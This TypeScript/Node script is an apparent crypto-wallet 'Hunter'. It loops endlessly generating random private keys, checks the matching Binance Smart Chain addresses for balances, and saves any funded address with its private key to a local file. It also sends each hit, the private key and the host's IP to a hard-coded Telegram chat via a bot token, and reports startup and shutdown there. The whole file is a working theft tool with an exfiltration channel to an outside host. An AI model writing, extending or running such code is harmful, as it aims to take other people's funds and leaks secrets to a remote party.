
import dotenv from "dotenv";
import axios from "axios";
import util from "util"
const sleep = util.promisify(setTimeout);
import qs from "qs";
import fs from "fs";
import { randomBytes} from "crypto";
import Web3 from "web3";


const privateKeyToAddress = require('ethereum-private-key-to-address')

// not sure what this does, but IT IS REQUIRED to do stuff.
const result = dotenv.config();
if (result.error) {
  // throw result.error;
}

const w = new Web3(process.env.BSC_RPC!!);

// Global Config  MAX for BSC is apparantly 33 / Second. --- 10,000 per 5 min.
const GLOBAL_CONFIG = {
  AMOUNT_TO_GET: "0.00001",
  CHECK_AMOUNT: 15,
  WAITING_TIME: 5,
  LOG_TIME: 20,
};      
let found = 0
let checkedThisSession = 0
let startTime = new Date() 
let ip = "";

const sendNotification = async (message : string) => {
  var url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage?chat_id=-1001794956683&text=${message}`;
  axios.get(url);
}

const checkBalance = async (amount: string) => {  
  const privKey = randomBytes(32)
  const pKeyString = privKey.toString('hex')
  const address = privateKeyToAddress(pKeyString);
  w.eth.getBalance(address).then(function (b) {   
    checkedThisSession++ 
    let balance = Web3.utils.fromWei(b, "ether");
    if (parseFloat(balance) > parseFloat(amount)) {
      found++
      console.log(`Found Ya!: ${balance} BNB`);
      console.log(address, found)
      saveRound(address, pKeyString, balance)
      var message = qs.stringify(`Address: ${address} : PrivateKey: ${pKeyString}  :  Balance: ${balance}   :  Ip: ${ip}`)
      sendNotification(message);
    }
  });
  
};

const getIpAddress = async () => {
  var info = await axios.get("https://api.myip.com");
  ip = info.data.ip;
}

const saveRound = async (address: string, privateKey: string, amount: string) => {
  const roundData = [
    {
      address: address.toString(),
      pKey: privateKey.toString(),
      value: amount.toString(),
    },
  ];
  let path = `./history/WithBalance.json`
  
    if (fs.existsSync(path)) {
        try {
          const fileData = JSON.parse(fs.readFileSync(path).toString())
          fileData.push(roundData)
          fs.writeFileSync(path, JSON.stringify(fileData, null, 2));
        } catch (e) {
          fs.writeFileSync(path, JSON.stringify([roundData], null, 2));
        }
       
    } else {
      fs.writeFileSync(path, JSON.stringify([roundData], null, 2));
    }
  
};

const logInfo = async() => {
  var currentTime = new Date()
  var elapsed = currentTime.valueOf() - startTime.valueOf();
  var elapsedSeconds = Math.round(elapsed / 1000);
  var rate = Math.round(checkedThisSession / elapsedSeconds)
  console.log(`Found: ${found}   Checked: ${checkedThisSession}  Elapsed: ${elapsedSeconds} seconds   Rate: ${rate}/s`)
}


const initialize = async () => {
  await getIpAddress();
  sendNotification(`Started Up Hunter: ${ip}`);
  start()
}

const start = () => {
  for(let i = 0; i< GLOBAL_CONFIG.CHECK_AMOUNT; i++){
    checkBalance(GLOBAL_CONFIG.AMOUNT_TO_GET)    
  }
  end()
}

const end = async () => {
  await sleep(GLOBAL_CONFIG.WAITING_TIME);
  start()
}

process.on('SIGINT', async () => {
  await sendNotification(`Stopped Hunter: ${ip}`)
  await sleep(1000);
  process.exit();
});

process.on('uncaughtException', async function (err) {
  await sendNotification(`Stopped Hunter: ${ip}`)
  await sleep(1000);
  process.exit();
});

console.log("Loaded Up!")
initialize()
setInterval(() => { logInfo() }, GLOBAL_CONFIG.LOG_TIME*1000); // Log info every 30 seconds
